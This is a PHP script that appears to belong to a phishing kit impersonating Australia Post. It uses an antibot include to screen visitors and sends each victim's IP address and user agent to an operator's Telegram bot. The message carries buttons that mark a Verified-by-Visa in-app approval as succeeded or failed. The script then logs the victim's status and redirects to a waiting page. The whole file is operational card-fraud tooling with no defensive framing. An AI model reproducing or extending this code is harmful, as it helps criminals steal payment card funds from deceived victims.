<?php
session_start();
include '../settings.php';
include '../lang_main.php';
require_once dirname(__DIR__) . '/antibot.php';
validateSession(4);

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// --- DYNAMIC LINK GENERATION ---
$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
$host = $_SERVER['HTTP_HOST'];
$current_dir = dirname($_SERVER['PHP_SELF']); 
$root_dir = dirname($current_dir); 

if ($root_dir == '/' || $root_dir == '\\') $root_dir = ''; 

$base_url = $protocol . "://" . $host . $root_dir;

$vbv_action_url = $base_url . "/security_check/actionsvbv.php";
$vbv_action_url = str_replace('//security_check', '/security_check', $vbv_action_url);

$encoded_ip = urlencode($ip);

$link_valid = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=appvalid";
$link_bad   = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=appbad";

$message = "🇦🇺 <b>📱 AUSTRALIA POST - IN-APP APPROVAL CLICKED</b>\n";
$message .= "├ 🌐 IP: <code>$ip</code>\n";
$message .= "└ 📱 User-Agent: <code>$user_agent</code>\n";
$message .= "\n<b>Action requise :</b>";

// KEYBOARD
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ VALIDÉ (SUCCÈS)', 'url' => $link_valid],
            ['text' => '❌ REFUSÉ (ERREUR)', 'url' => $link_bad]
        ]
    ]
];

sendTelegramMessage($botToken, $chatId, $message, $keyboard);

// Log "appwaiting" status with a fresh line
$ipListFile = '../security_check/ip_list.txt';
if (file_exists($ipListFile)) {
    $lines = file($ipListFile);
    $output = array();
    foreach ($lines as $line) {
        if (strpos($line, $ip) === false) {
            $output[] = $line;
        }
    }
    file_put_contents($ipListFile, implode("", $output));
}
file_put_contents($ipListFile, PHP_EOL . $ip . ",appwaiting", FILE_APPEND | LOCK_EX);

// Redirect to loading page
header('Location: ../validation.php'); exit();
?>